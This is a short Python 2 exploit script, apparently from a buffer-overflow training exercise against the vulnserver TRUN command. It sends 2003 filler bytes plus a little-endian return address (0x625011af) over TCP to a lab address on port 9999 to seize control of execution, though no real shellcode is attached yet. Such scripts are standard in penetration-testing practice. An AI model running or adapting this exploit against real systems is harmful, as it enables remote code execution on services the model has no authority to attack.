#!/usr/bin/python
import sys
import socket

# 0x625011af

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.11.23.92',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting."
	sys.exit()